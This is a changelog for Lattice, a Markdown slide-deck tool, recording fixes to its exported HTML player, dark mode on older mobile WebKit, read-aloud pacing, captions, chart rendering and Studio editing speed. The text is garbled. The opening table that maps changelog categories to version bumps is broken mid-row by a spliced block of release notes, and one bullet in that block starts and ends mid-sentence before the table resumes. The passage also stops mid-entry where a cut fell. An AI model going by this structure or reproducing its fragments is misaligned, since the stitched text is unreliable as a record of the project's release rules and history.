# Changelog

All notable changes to Lattice are documented here. The project follows
[Semantic Versioning](https://semver.org/spec/v2.0.0.html) with one explicit
contract: **layouts and palette tokens are stable surfaces.** Breaking
changes to either are major version bumps. New layouts and new themes are
additive minor versions. Mermaid CSS overrides are internal and may change
in patch versions.

> **This file drives the release.** `## Unreleased` is the source of truth
> for the next version. `tools/changelog.js` reads its Keep-a-Changelog
> categories to pick the bump deterministically, and the release workflow
> rolls `## Unreleased` into a dated `## <version> - <date>` section:
>
> | Category in `## Unreleased` | Bump |
> |---|---|
> | `### Removed`, or any `**Breaking:**` bullet / `BREAKING CHANGE` token | **major** |
> | `### Fixed

- **Read-aloud no longer clicks/pops between sentences.** Each TTS clip now eases in and out of
  silence through a short (~8 ms) head/tail gain ramp, instead of a hard `start(0)`/stop that steps
  from silence to a mid-waveform sample — the step was an audible click at every sentence boundary,
  worst on slides that narrate many short fragments (e.g. a stat row). On-device report; fixed in
  `voice-model.js` `playBlob`.
- **The exported `.html` player is now a flex-column shell — Present centers
  reliably on mobile and dark mode reaches the slides, not just the page.** Two
  on-device follow-ups after the previous round: (1) **dark mode flipped the page
  but not the slides** — an older engine repainted `:root` when a custom property
  changed but didn't re-propagate the new value down to the already-laid-out slide
  section subtrees. The dark-token overrides are now set on `:root` **and directly
  on every `section[data-lattice-slide]`**, so a slide's `background:var(--bg)`
  reads its own dark value with no reliance on `:root` inheritance re-propagating.
  (2) **Present still wasn't centered** — the stage used `position:fixed` against a
  layout viewport that a mobile in-app browser reports taller than the visible
  area. The whole player is now a **flex column at `100svh`** (the visible
  viewport): the bar is a flex child (no longer `position:fixed`), and the Present
  stage is the growing child (`flex:1`) that `place-items:center` centers in real
  visible space — no `position:fixed`, no JS-measured height, nothing to misreport.
  Read·Slides and Read·Article are the column's scrolling children. The **prev/next
  arrows moved into a bottom control row** below the slide, so they never overlay
  content and the centering box stays symmetric. The **active Present frame now
  sizes to the SCALED footprint** (via a `--lp-fit-present` CSS var), not the raw
  1280×720 — a fixed 720px frame overflowed a phone stage shorter than 720px, and
  grid can't center an oversized item (it top-aligns it), which pushed the slide
  down; a footprint-sized frame centers cleanly at ANY stage height. Verified in
  Chromium: symmetric, unclipped centering at 390×700, 390×560, 740×360 (short
  landscape), 820×1180, and 1440×900, plus page+slide colour flip. *The svh flex column + the
  direct-on-section tokens are the robust replacement for the fixed-position +
  :root-only-inheritance approaches; still pending confirmation on the exact in-app
  browser.* In Read·Slides, each frame is now `flex:none` so it keeps its full
  height and the view SCROLLS — without it the flex column shrank every fixed-height
  frame to fit the stage, squishing the cards while the scaled slide inside stayed
  full height and overflowed (clipped).
- **The exported `.html` player's dark mode now works on older mobile WebKit —
  the real on-device fix, after the first attempt still shipped a white deck.**
  The dark-override block emitted each surface token's dark value as
  `--bg: var(--scheme-dark-bg)` — a custom property pointing at *another* custom
  property (the literal `#001D33`) defined in a **different** `<style>` block. An
  older in-app-browser WebKit couldn't resolve that cross-block indirection, so
  `--bg` went guaranteed-invalid and `background: var(--bg,#fff)` fell back to
  white — a white page and white slides that no tap could fix, even though the
  accent colours (whose dark value is a literal) came through. The export now
  **flattens** every dark value to a literal at build time (`--bg:#001D33`, zero
  indirection); a `var()` that points at a token redefined *within* the dark block
  (e.g. `var(--accent)`) is deliberately kept. The dark/light toggle also now
  **stamps the `data-lp-scheme` attribute at load** (from `matchMedia`) so the
  deck's colours ride only on a plain attribute selector + literals — never the
  CSS `light-dark()` function, a `var()` chain, or a `prefers-color-scheme` media
  query (kept only as a no-JS fallback). Every feature this now needs predates
  2016 WebKit. Proven by stripping every `--scheme-dark-*` definition from a real
  export and confirming dark mode still renders dark (the literal block survives
  exactly the cross-block-var failure that broke the device). *Still not run on
  the exact in-app browser that surfaced it, but the fix removes the failing
  mechanism rather than tuning around it.*
- **The exported `.html` player's Read·Slides view now frames each slide with a
  visible border + drop shadow.** They sat on the `transform:scale(~.28)`
  `<section>`, so the 1px border shrank to a sub-pixel hairline and the outward
  shadow was clipped away by the frame's `overflow:hidden` — a white slide on the
  white page had no visible boundary at all. Moved onto the unscaled `.lp-frame`,
  where the border is a true 1px and the shadow paints outside the frame's box, so
  every slide reads as a distinct card.
- **The exported `.html` player's Present prev/next arrows no longer overlay the
  slide.** The fit now reserves a horizontal gutter sized to the arrow width, so
  the circular controls sit beside the slide instead of over its left/right edges
  (verified clear of the slide at mobile/tablet/desktop).
- **The exported `.html` player now centers Present and switches dark/light on
  older mobile browsers — two failures that only showed on a real device, never
  in headless Chromium.** Both traced to the player leaning on modern features an
  older in-app-browser WebKit doesn't have: (1) **Not centered** — the Present
  stage computed its height in JavaScript from `innerHeight`/`visualViewport`. A
  third-party iOS in-app browser (the GitHub app's viewer, etc.) reports a *layout*
  height taller than the actually-visible area between its address bar and bottom
  toolbar, so the stage overshot and the centered slide was pushed down with a big
  gap above it. The stage is now pinned on all four edges (`top:48px … bottom:0`)
  and the browser computes the height natively — no JS measurement to misreport;
  the `--lp-vh` variable and its `setStageHeight` machinery are gone. (2) **Dark/
  light toggle did nothing** — every theme token is authored as `--t: light-dark(L,
  D)`, and the CSS `light-dark()` function only shipped in Safari/WebKit 17.5
  (mid-2024). On an older engine it's an invalid value, so every color token went
  unset (the deck fell back to a white page with wrong slide fills) *and* the toggle
  — which only flipped `color-scheme`, a thing nothing but `light-dark()` reads —
  was inert. There was no `@media(prefers-color-scheme)` fallback anywhere. The
  export now resolves each `light-dark(L, D)` pair at build time into a plain light
  base plus an explicit dark override, gated by a `data-lp-scheme` attribute (the
  manual toggle) and a `prefers-color-scheme` media query (the system default,
  overridable) — plain CSS supported for a decade, so the deck themes correctly and
  the toggle works on every engine. The resolved colors are byte-identical to what
  `light-dark()` produced on a modern browser (same L/D values, different plumbing),
  verified in Chromium in light and dark at 390/820/1440. *Not verified on the exact
  in-app browser that surfaced this (no access to it from CI); the fix removes the
  unsupported features entirely rather than tuning within them, so the mechanism a
  modern browser exercises is now the same one the old browser gets.*
  the top bar's height. The original design (`engineering/decisions/
  2026-07-07-html-lattice-player.md`'s verification bar) specified icon-only
  controls on mobile from the start; an intermediate round instead compacted
  the bar to keep icon+text everywhere, which crowded the notes/fullscreen/
  mode controls toward the edge on a real "Welcome to Lattice" export at phone
  width. The tabs are now icon-only below 560px — the text label is never
  removed from the DOM (still the accessible name via `aria-label`, still
  real content behind a standard sr-only clip), only visually hidden — and
  every icon control's tap target grew (~26–33px → ~36–38px) to reduce the
  crowded feel the compact-but-labeled bar had. Icon+text is unchanged at
  tablet/desktop, where there's room. (3) The speaker-notes,
- **A Studio-exported `.html` player with a `describe:` (accessible-description)
  comment no longer shows that description as extra, duplicated visible text.**
  Reported as "the title/subtitle/intro block appears twice" in Read · Article on
  a real deck. Root cause: the CLI's own `docHtml` bakes in a small Marp-equivalent
  CSS block (`lattice-emulator.js`'s `marpSystemCss` — page-number `content:attr()`,
  `aside.lattice-notes{display:none}`, and a `.lattice-description{…}` sr-only
  rule), but the Studio's browser-built `docHtml`
  (`share-export.ts`'s `buildSelfContainedDoc`) never included it — so the
  accessible-description `<p>` it injects (same element both paths inject) had no
  CSS to hide it, rendering as a plain visible paragraph restating the slide's own
  heading/body, in Present *and* Read · Article, and every deck's page-number span
  had no `content:attr()` binding to read from. That CSS now lives in the ONE
  assembler both paths share (`lib/export/player-core.mjs`'s `playerCss()`), so the
  gap closes for both hosts instead of leaving it CLI-only. Read · Article's prose
  projection also now skips `.lattice-description` explicitly (`SKIP_SELECTOR`) —
  it's a screen-reader synonym for content the article already renders as real
  prose, not a second copy to show sighted readers.
- **`autosplit: on` now works in the packaged CLI.** The npm-shipped bundle
  looked for component manifests in its own `dist/` directory (which ships
  none), so the Fit Ladder's measured auto-split silently never ran for
  `npx lattice` users — decks rendered with overflowing slides instead of
  splitting. The CLI now resolves manifests from the package root, and
  warns if the registry ever comes up empty under `autosplit: on`.

### Added`, `### Changed`, `### Deprecated` | **minor** |
> | `### Fixed`, `### Security` | **patch** |
>
> Keep entries here current **as changes land** (see `CLAUDE.md`) — an empty
> `## Unreleased` means there is nothing to release. Flag a breaking change
> by leading the bullet with `**Breaking:**` so it counts as major even
> under `### Changed`.

## Unreleased

### Fixed

- **The playground's gallery drawer now labels front-matter-less decks with the right slide
  count, and the diagram-component reference gallery's three experimental diagrams render
  clean.** Two follow-ups from the curated-diagram-gallery work: (1) `galleries.mjs slideCount()`
  assumed every deck opens with YAML front matter and subtracted its two fences — so the bucket
  and showcase galleries that open with a comment or `_class` directive (chart, data-viz, diagram)
  were undercounted by two (the 22-slide Diagrams tour read "20"). It now detects front matter and
  counts either shape correctly (unit-tested). (2) The component-level `diagram` reference gallery
  still carried the pre-fix Mermaid: venn's two labeled intersections collided into unreadable
  overlap, ishikawa printed a stray `fishbone` head and quoted effect, and C4 rendered a redundant
  floating title. All three now render clean — the same fixes already shipped in the playground tour.

- **Read-aloud breathes between sentences instead of rushing.** A clocked voice (Kokoro et al.)
  synthesizes each sentence as its own clip with almost no trailing silence, and playback ran them
  back-to-back — so even at the default speed the narration felt hurried, "like the reader never
  stopped for air." Playback now inserts a short pause between sentences, sized to the sentence's
  punctuation and set EQUAL to the caption estimate's own inter-sentence gap so the word-highlight
  rests in the silence rather than racing ahead of the voice. (Audio-path change; no exported bytes
  change.)

- **Changing the TTS model / voice / speed now updates every surface immediately.** Only the rung
  setter broadcast a change event, so picking a different model wrote the preference but left the
  settings panel, the Present voice indicator, and any second open surface showing the stale choice
  until they remounted. All four pref setters (`setOrModel` / `setOrVoice` / `setKokoroVoice` /
  `setSpeed`) now emit `db-voice-changed`, which every voice-aware surface already listens for.

- **Read-aloud now speaks a `split-compare` column's header — "Slide editors: …", "Lattice: …",
  not just the unattributed bullets.** Each column renders as `.option > <strong>header</strong> +
  <ul>bullets`, but a bare `<strong>` is not a block the generic narration walker selected, so the
  column header was dropped and its bullets read with no owner. The walker now picks up a bare
  `<strong>` immediately preceding a list and reads it as the list's label (via the same
  `labelValue` helper). Only a bare strong sibling triggers it — an author's inline bold inside a
  paragraph is unaffected. Guarded in `test/unit/transformers/prose-projection.test.js`.

- **Component captions no longer double their punctuation — a card title that ends in a
  period reads "Write: …", not "Write.: …".** The prose projection joins a component's
  `label: value` narration, but a label that already ended in a sentence terminator (an
  authored card title "Write.", "Choose a component.") or a stray separator produced a
  doubled "Write.:" in the caption crawl and the exported `.vtt`. All `label: value` joins
  (stats/kpi, tables, nested lists, definition lists, state markers) now route through one
  `labelValue` helper that drops a trailing period/ellipsis/separator from the label before
  the colon, so the rule can't drift between walkers. A label ending in a **strong terminator
  (`?` or `!`)** keeps it and takes **no** colon — the value follows as its own sentence
  ("What's the ROI? Forty percent."), so the voice's question/exclamation inflection does the
  work. Regression-guarded in `test/unit/transformers/prose-projection.test.js`.

- **Read-aloud reads a decorative separator as a pause, not a swallowed word — an eyebrow like
  "Lattice · A guided tour" now narrates "Lattice, A guided tour".** A standalone interpunct
  (`·`), pipe (`|`), bullet (`•`) and kin have no good TTS reading; the old rule dropped `·` to
  nothing, so the two label halves ran together ("Lattice A guided tour"). They're now spoken as a
  soft comma pause (whole-token only — a `·` inside a voice id like "Heart·US" is untouched), in the
  SPOKEN form only, so captions and the `.vtt` keep the glyph. One rule in cadenza `toSpoken` owns
  the family; the dead `'·': ''` lexicon entry is retired. Guarded in `cadenza/normalize.test.ts`.

- **Read-aloud no longer drops the value after a colon — a "label: value" caption is now
  spoken in full.** The live Present narration projects component captions as `label: value`
  ("components: 53", "Total revenue: $1.2M"), but a colon is a TTS hard-stop: Kokoro (and many
  voices) speak only the label and drop the number, and because the resulting clip is short the
  word-highlight then crams the whole line into it and visibly races. This was the
  live-narration regression the shared DOM projection (#904) introduced — the old Markdown
  flatten carried no such colon, which is why it "used to work." Fixed in the one canonical place
  (cadenza `toSpoken`): a **trailing colon/semicolon is softened to a comma in the SPOKEN form
  only** — a soft prosodic pause the voice honors without dropping the value. The DISPLAY word
  keeps its colon, so caption crawls and the exported `.vtt` (display-text glyphs) are **byte-for-
  byte unchanged**; only what the voice says changes. Mid-token colons (times `3:30`, ratios
  `16:9`) are untouched. Regression-guarded in `cadenza/normalize.test.ts`.

- **The dual-screen presenter's current + next slides are no longer cropped — they render
  whole, scaled to fit their frames.** The presenter stage inlines the shared fit kernel
  (`fitScale`/`padInset`) into its isolated iframe via `Function.toString()`, but the production
  bundler renames those imports, so the inlined bodies printed under renamed/anonymous names
  while the fit's call sites still used the literal names — every fit call threw "padInset is not
  defined" and silently never scaled the slide, so it painted at full 1280px and the frame
  cropped it (visible in production too). The kernel is now bound as `var fitScale = …; var
  padInset = …;` so the names survive bundling. The stage also stopped scaling the engine's own
  `<section>`s (which the engine runtime re-manages) — the deck is wrapped in a private
  `#latt-film` element that's scaled + translated as a filmstrip clipped to the current slide, so
  nothing fights the engine. Fixes the Studio presenter and, via the shared kernel, the Drawing
  Board's presenter and rehearsal stage. (Studio Present.)

- **"Print deck" now builds a real, print-ready PDF — one slide per page at the chosen
  paper size — and opens it in a new tab, instead of trying to print an HTML page of the
  deck.** The earlier fixes still misbehaved on iPhone: an in-app print printed the Studio
  chrome (mobile browsers hand the whole top document to the system print sheet), and even
  opening the deck as its own HTML tab **clipped and flowed continuously** — iOS Safari
  ignores CSS page-size and won't reliably page-break a scaled layout, so a 7-slide deck
  came out as 4 sliced pages on US Letter. "Print deck" now shows a small options panel
  (paper size Auto/Letter/Legal/A4 · orientation Auto/Landscape/Portrait · **Color or Black
  & white** · Fit-to-page or Actual size) and generates a **real PDF** with those choices
  baked into each page's geometry — the slide fit + centered with a safe margin, B&W through
  the `section.print` band — then opens it in a new tab (pop-up-blocked → downloads instead).
  A PDF's page size is honored exactly by iOS and every printer, so it prints one-slide-per-
  page at the right size on iPhone and desktop alike. Auto sheet-pick stays the default (16:9
  → US Legal landscape, 4:3 → Letter). See `engineering/decisions/2026-06-14-deck-print-styling.md`.
- **A `big-number` slide is now spoken as one phrase ("0 boxes to drag…"), not truncated to
  just the figure.** The number + its caption are authored as a bare list (`- 0` / `  - caption`),
  so narration ran them through the generic nested-list join and put a COLON between them —
  "0: boxes to drag". A text-to-speech voice treats a colon right after a tiny token as a hard
  stop: it says "zero" and drops the rest, so a hero-number slide read aloud as only its number.
  The `big-number` component now has its own narration walker that reads `value` straight into
  its `caption` with no colon (and keeps the eyebrow), on every surface that shares the projection
  (CLI/PDF export, the Share → Captions download, and live Studio Present read-aloud). Only the
  spoken string changes — the on-screen slide and caption are untouched. Fixes the
  live-site report where a big-number slide narrated as "zero" alone. See
  `engineering/decisions/2026-07-11-manifest-speech-contract.md` §19.
- **Present autoplay ("Play") now chains through the whole deck instead of freezing after ~two
  slides.** Since narration became async state (#904), the slide index changed one render commit
  before the reader was rebuilt for the new slide's text — so on a real (slower) device the
  auto-advance's `play()`, scheduled a frame earlier, ran against a reader the pending rebuild
  then tore down (leaving playback stopped, no caption, and — since a teardown fires no
  "finished" signal — no way to advance again). A second path did the same when the whole-deck
  narration projection landed mid-hand-off and swapped the current slide's text. Both are fixed
  structurally (no timers): the auto-advance is now bound to the reader's track rebuild so it
  always starts the freshly-built reader in the same commit, and the projection upgrade can no
  longer swap text during an autoplay run. Found via an independent-checker + red-team +
  Munger-inversion trio; the prefetch/warm-ahead was exonerated. (Studio Present.)
- **A non-English deck's narration no longer gets English words injected into it.** Cadenza's
  say-as machinery — the abbreviation lexicon, number-to-words, and the fiscal/period parser
  (`FY26` → "fiscal year twenty-six", `40%` → "forty percent") — is US-English, so a deck
  authored in another language had English spoken into its captions (and its caption timing
  skewed). Set the Marp `lang:` front-matter directive to a non-English tag (e.g. `lang: fr`)
  and the English lexicon + number/period expansion are bypassed — the text is narrated as
  authored. Your own `acronyms:` registry is still honored (you own those expansions).
  English decks (`lang:` absent, `en`, or any `en-*`) are byte-identical to before. Threaded
  through all three caption producers — the CLI/PDF export, the docs-site Share → Captions
  download, and live Studio Present read-aloud — so they agree. Audio is unaffected in CI
  (no TTS); only the spoken string is claimed. See
  `engineering/decisions/2026-07-11-manifest-speech-contract.md` §17.
- **Mermaid diagrams no longer render as black nodes in the exported player's Read·Article
  view — and diagram figures now break out to full width like the charts.** Read·Article
  re-hosts a diagram's SVG into a `<figure>` outside its slide `<section>`, but every mermaid
  colour rule in `lib/integrations/mermaid/mermaid.css` was scoped to `section ` (the Marp slide
  root), so nothing matched once re-hosted and each node fell to SVG's black initial fill. The
  guard is now `:is(section, figure) ` — element-only, so it's specificity-identical (0,0,1) to
  the old `section ` and leaves every slide/PDF cascade byte-unchanged, while the `figure` arm
  colours the re-hosted diagram (mermaid's class names are unique to a mermaid SVG, so it can
  never leak onto another figure). With colour restored, diagram figures drop the temporary
  prose-width hold from the responsive pass and break out like the other charts. Verified the
  article diagram renders identically to the slide (nodes, edges, labels) in light and dark.
- **The docs-site "Share → Captions" download now narrates a note-free deck instead of
  producing an empty `.vtt`.** The in-browser caption download built the track from speaker
  notes ONLY, so a deck with no notes exported an empty caption file — while the CLI
  `--captions` export (which gained the component-aware DOM projection earlier) produced real
  captions. The download now resolves the SAME narration chain the CLI uses (inline
  `<!-- caption: -->` → front-matter `captions:` → note → DOM projection) plus the deck's
  `acronyms:` registry, via the shared `mergeNarration` (one source of truth, HARD RULE #1), so
  the two producers can't drift. It projects the already-rendered slides (no second render) and
  degrades to notes-only if projection is unavailable, matching the CLI. Note: for a deck a user
  had `acronyms:`/note-free content in, the downloaded `.vtt` bytes now differ (captions where
  there were none, acronyms expanded) — verified against the CLI's projected `.vtt`; the real
  browser download itself is exercised only through the shared kernel (no headless Studio in CI).
  Closes #902 (Gap 2). *(An autosplit deck's client `.vtt` intentionally tracks the docs render,
  which doesn't run the Fit-Spine split, so it differs from the CLI's split artifact — Gap 1,
  chart-narration parity, remains open.)*
- **Charts no longer render solid black in the exported `.html` player's
  Read·Article view.** Read·Article re-hosts each slide's chart SVG into a flowing
  `<figure>` — but the chart-family paint lives in rules scoped to the slide
  `section` (`section.chart-frame` for the `--chart-cat-*`/`--state-*` tokens and the
  SVG legend ink; `section.funnel .funnel-band`, `section.piechart .wedge`,
  `section.radar`, `section.quadrant`, `section.map`, … for the fills). Outside that
  ancestor every `color-mix(var(--chart-cat-N-hue) …)` collapsed to an undefined
  var and the shapes fell to SVG's black initial fill. The re-hosted figure now
  carries the `chart-frame` class, and each chart's colour rules accept it via
  `:is(section.<comp>, figure.chart-frame)` (specificity-preserving; the component's
  unique descendant classes keep the figure arm from leaking across chart types), so
  funnel, map, quadrant, radar, and piechart — the self-contained data charts that
  re-host cleanly — paint in full theme colour (legend swatches, labels, and values
  included) in both light and dark exports. Map's `--map-base` anchor, previously
  only on the stripped `.map-figure` wrapper, is also set on the surviving `.map-svg`.
  The **spatial** charts — word-cloud (a packed spiral), journey (swim-lanes), and
  state-chart (a node-and-edge graph) — don't linearize to a static figure (the bare
  SVG re-hosts as orphan fragments or an overflowing overlap), so they now show the
  honest "best seen in the Present or Read·Slides view" placeholder, the same
  treatment gantt / kanban / progress / roadmap / timeline-list already reach. Real
  slide render paths (PDF / Present / Read·Slides) are byte-unchanged — a real chart
  section carries both `<comp>` and `chart-frame` classes, so the `:is()` match set is
  identical there; only the projected article figure newly matches the `figure.chart-frame`
  arm.

### Changed

- **Read-aloud timing is now a prosody-grounded pace model, not a flat wpm × character-length
  guess.** Word duration rides a **syllable count** (~200 ms/syllable at a ~150-wpm boardroom
  default), not character length, so an 8-letter one-syllable word no longer out-dwells a short
  three-syllable one — an all-caps initialism ("PDF", "HTML") counts its spelled-out letters, and a
  contraction ("I'll", "don't") stays one word, so the highlight no longer stalls on either. Pauses
  are **graded by boundary depth** (comma ~200 · clause ~350 · sentence
  ~550 · trailing-off ~650 ms) instead of one flat value; the word before a boundary gets
  **phrase-final lengthening**; the inter-sentence audio "breath" mirrors the same graded table
  (× a clip-silence discount, kept in step by a cross-file test), so the silent estimate and the
  audio pace stay aligned; and the
  word-highlight is **biased ~40 ms ahead** of the voice (a lagging highlight is the more noticeable
  sync error — asymmetric lip-sync tolerance). Grounded in a speech-science research pass
  (`engineering/decisions/2026-07-12-narration-pace-model.md`), structured so a later thread can
  calibrate the coefficients per-voice against measured TTS onsets. Caption `.vtt` *text* is
  unchanged; its word *timestamps* shift with the new model.

- **The flow-height charts — roadmap, progress, kanban, gantt, timeline-list — now render live
  in the exported player's Read·Article view instead of a raw table / placeholder.** These are
  pure HTML+CSS layouts (no SVG) sized only in `cqi`; re-hosting their inner table/list dropped
  the `section.<comp>`-scoped styling (roadmap's state markers collapsed into run-together text,
  and its bare table overflowed a narrow column) or fell back to a bullet list. Each one's whole
  `.chart-body` is now re-hosted into a `.lp-chart` figure — a WIDTH container
  (`container-type: inline-size`, content-driven height, unlike the aspect-locked word cloud) —
  and each component's CSS is broadened `section.<comp>` → `:is(section.<comp>, figure.<comp>)`
  (specificity-preserving; the `section` arm keeps every slide render byte-identical) so the board
  paints in the figure exactly as on the slide, variant modifiers and `--chart-cat-*` colours and
  all. The figure breaks out to the ~1200px cap; a wide roadmap on a narrow viewport scrolls in
  its own box, never the page. Verified light + dark at 390 / 1440px with no page overflow.
  *(journey and state-chart stay on the placeholder — they bake pixel geometry / height-relative
  fills at export and need a runtime re-measure in the article box; tracked follow-up.)*

- **The playground's "Diagrams" gallery is now a curated fourteen-type Mermaid tour, not a
  single flowchart.** The diagram bucket has one component, so its generated survey gallery was
  one slide — the playground's "Diagrams" entry loaded that lone flowchart. The bucket gallery is
  now hand-authored (`galleryAuthored` marker, same opt-out as `legal`): twenty-two slides that
  walk every graph-substance Mermaid type Lattice renders well — flowchart, sequence, sankey,
  class, ER, requirement, packet, mindmap, tree, architecture, C4, ishikawa, venn, gitgraph —
  grouped by purpose (flow, structure, hierarchy, cause) and told over one running product story
  so it reads with the chart gallery, not against it. It deliberately **hands the quantitative
  shapes off to native charts**: a closing `compare-table` maps gantt/timeline/journey →
  `gantt`/`timeline-list`/`roadmap`/`journey`, pie/quadrant/radar → `piechart`/`quadrant`/`radar`,
  and kanban/stateDiagram → `kanban`/`state-chart`, because the native SVG components are
  themeable, lighter, and export-clean. Every diagram was rewritten fresh (not lifted from the
  component-level type reference), verified in both themes and in the live playground.

- **A word-cloud now renders live in the exported player's Read·Article view instead of a
  placeholder.** Spatial charts lay out in `cqi`/`%` units and can't re-host as a bare SVG (no
  container context → overflow/overlap), so they showed a "best seen in Present / Read·Slides"
  card. The word-cloud's whole `.chart-body` is now re-hosted into a bounded `.lp-spatial` figure
  (`container-type: size` + `aspect-ratio`) that re-establishes the definite box its layout needs —
  the same box the slide's cell-stage gives it — and the component CSS is `figure`-scoped so the
  words paint in full theme colour. It breaks out to the ~1200px cap like the other charts, light
  and dark. *(The other two spatial charts stay on the placeholder for now: state-chart's edges are
  baked to the slide's pixel measurements at export and can't be re-aligned without a runtime
  re-measure in the article box; journey's affect-contour fill is height-relative and doesn't
  translate to an article box without ballooning — both tracked follow-ups.)*
- **The dual-screen presenter view is now brand-dark and speaks the deck's accent.** The
  second-screen speaker view (current + next slide, speaker notes, timer) was off-brand hardcoded
  grays; it's now a warm near-black frame that **adopts the same accent as the Studio it launched
  from** — the wordmark, the forward control, and the panel outlines take the live `--accent`
  (forwarded to the popup), so a blue-themed deck gets a blue-accented presenter and a cuoio deck a
  gold one (cuoio gold is only the fallback). Notes are larger and wrap long strings; the slides
  render whole and uncropped in their own theme inside 16/9 frames; and **Reset timer now arms then
  confirms** so a stray click can't wipe your elapsed time mid-talk. Chrome only — the
  window/postMessage protocol and slide-stage pipeline are unchanged, so the Drawing Board's
  presenter inherits the restyle (gold fallback, since it forwards no accent). (Studio Present
  redesign — S5.)

- **Present mode is redesigned around "Quiet Bloom" — the slide owns the screen; the
  chrome blooms on intent.** At rest only the essentials show (Play, position, the section
  title and a hair-thin rail); the flanking circular arrows fade to faint, and the CC / Voice
  controls and caption fold away — then bloom back the moment you move the pointer, wheel,
  press a key or touch the screen, and fold again after a beat (pointer-over or keyboard focus
  pins them open so a click never chases a fading control). The dock now follows one order —
  **caption → controls → section title → full-width rail** — with the caption a transparent
  film-subtitle (no box) that grows in on Play and folds on Pause, so the slide never fights it.
  Navigation gains **swipe** (touch) and **mouse-wheel** (desktop) alongside the keyboard, sharing
  the same geometry as the export player's transport kernel; the section rail now shows on mobile
  too. A one-time first-run cue teaches the gestures. Reduced-motion keeps the controls permanently
  visible (a stable UI) and drops the animations. Verified light + dark at 390 / 820 / 1440px.
  (Studio Present redesign — `engineering/decisions/2026-07-12-studio-present-redesign.md`, S4.)

- **Present mode now has one Play and independent Captions / Voice.** Play narrates the
  current slide and advances through the deck like a video — the separate "Autoplay" toggle
  is gone (it was the same action). Captions (**CC**) and **Voice** are now two independent
  toggles: show the captions with no voice (they run on a reading-cadence clock) or speak them
  aloud. Voice defaults to muted, so Present never talks over you unasked. (Studio Present
  redesign — S3.)

- **The exported `.html` player's Read·Article view is now responsive — charts break out of
  the reading column and use the screen.** The article was a fixed ~740px column, so on a wide
  display a chart rendered at ~676px with the rest of the screen empty. It's now a breakout
  grid: prose keeps its readable ~740px measure, while figures (the color charts — funnel, map,
  quadrant, radar, piechart — plus display math and images) break OUT to a ~1200px cap, centered,
  and are height-capped at `78vh` so a tall or square chart stays fully visible instead of forcing
  a scroll past one giant figure (`preserveAspectRatio="meet"` letterboxes cleanly — no distortion).
  A `ResizeObserver` "sitter" keeps the active TOC entry scrolled into view as the window or a
  breakout figure reflows the layout; display math scrolls horizontally inside its figure rather
  than overflowing the page (injected only with the KaTeX stylesheet, so a math-less deck stays
  katex-free). Verified light + dark at 390 / 820 / 1440 / 1680px with no horizontal overflow.
  *(Diagram/mermaid figures are HELD at prose width for now — their node fills are still
  `section `-scoped and render uncolored once re-hosted; widening them would only enlarge that,
  so the in-article mermaid colour fix and live rendering of the spatial charts — word-cloud,
  journey, state-chart — are tracked follow-ups.)*
- **A chart slide's exported captions now narrate the computed facts, matching live
  Present exactly.** A `funnel` / `journey weighted` / `radar` / `quadrant` /
  `state-chart` slide narrates a number that exists only in the rendered chart — a
  funnel's stage-to-stage conversion %, the auto-fit scale an unlabeled axis is plotted
  against, a state machine's inferred start/terminal states. Live Studio Present already
  spoke these (its `narrateChart`); the `.vtt` export projected every chart as a visual
  and emitted only the heading, so a chart narrated far thinner in the exported captions
  than live. The 7 chart narrators moved into the shared kernel (`lib/core/chart-narration.js`,
  on the shared `lib/core/slide-speech.js` base), and both the CLI/export caption sidecar
  and Present now run the SAME kernel — one copy of the narrator logic, so a chart slide's
  Markdown narrates identically wherever it runs (they align that kernel to each rendered
  section under the house `---`-per-section convention). The
  narrators substitute at the projection precedence level, so an inline `<!-- caption: -->`,
  a front-matter `captions:` entry, or a speaker note still wins. Closes the last narration
  divergence for the chart family (prose parity + the empty-`.vtt` note gap shipped earlier).
  Changes the exported `.vtt` bytes for decks with chart slides; audio is unaffected (captions
  time off pace, not a voice). See `engineering/decisions/2026-07-11-manifest-speech-contract.md`
  §13.6.

- **Present-mode captions are now a teleprompter crawl instead of a box that buried
  the slide.** As read-aloud plays, the sentence being read stays centered, already-read
  lines lift up and out, upcoming lines rise from the bottom, and words highlight as they
  are spoken — only a ~3-line focus band is ever visible, so the caption can no longer
  cover the slide the way the old full-narration box did. (Studio Present redesign — S2.)
- **Editing in the Studio is dramatically snappier — a warm edit's engine cost dropped
  ~15× (≈141 ms → 9 ms on a throttled phone profile).** The engine re-packed the whole
  ~1 MB theme stylesheet into its ~560 KB per-render form on *every* keystroke, even though
  the result is identical for a given theme + size and (on an in-place edit) immediately
  thrown away — it was ~92 % of the per-edit engine time. The composed stylesheet is now
  memoized per (theme, size) and reused across renders, cleared whenever a theme is
  registered. Output is byte-identical, so exported PDF/PPTX/HTML are unchanged; the win is
  the live preview's typing responsiveness. Measured browser-side against the production
  build (`npm run perf:frame`): whole edit→paint 147 ms → 17 ms. §D of
  `engineering/decisions/2026-07-11-preview-performance-diagnosis.md`.
- **The live performance panel now tells the truth about the FRAME / TOTAL numbers.**
  After the patch path landed (an edit swaps the slide body in place instead of rebuilding
  the whole preview), the panel kept judging FRAME by a single-frame budget (`good < 16ms`)
  — a budget a *full rebuild* can never meet — and it EMA-blended the ~2ms warm patch with
  the ~485ms cold rebuild into one meaningless number, so a rare theme switch quietly poisoned
  the fast typing reading. Each render now carries its regime (`patch` vs `rebuild`); the panel
  smooths and rates the two **separately** — a patch against the frame budget (green while you
  type), a rebuild against a realistic full-reparse budget — and labels which one you're seeing,
  with honest explanations (the cost is the stylesheet reparse a rebuild pays and a patch skips,
  not slide weight). Verified on the real built Studio: typing reads `patch ~1ms`, a light/dark
  switch reads `rebuild ~250ms`, and the rebuild no longer blends into the typing number.
  Metrics honesty (§C1) of `engineering/decisions/2026-07-11-preview-performance-diagnosis.md`.
- **Manifest metadata rename: `variantDocs.*.caption` / `stressDoc.caption` → `summary`.**
  Captions Layer-1 (#914) made *caption* a first-class narration concept (a slide's read-as
  text); the component-manifest field also named `caption` was always a **one-sentence
  description** of a variant / stress-test (a specimen-footer summary, not read-as text), so it
  is renamed to `summary` to end the collision. Pure rename across the 52 manifests (200 fields),
  the schema, the validator (`variantDocs.*.summary` / `stressDoc.summary` are now the required
  keys), the docs generator, and the docs-site / playground consumers — **no rendered output
  changes** (the generated galleries still print the same specimen-footer text; the plan's
  rendered `caption` footer key is unchanged). Manifest authors now write `summary:`; the old
  `caption:` key fails validation. Closes #918.
- **Editing a slide in the Studio no longer re-parses the whole theme stylesheet on
  every keystroke-render.** The Studio's live preview (`single-slide-render.ts`)
  rewrote the entire preview-iframe document on every render — re-parsing the ~560KB
  theme CSS and re-executing the runtime each time (~485ms on a throttled phone, the
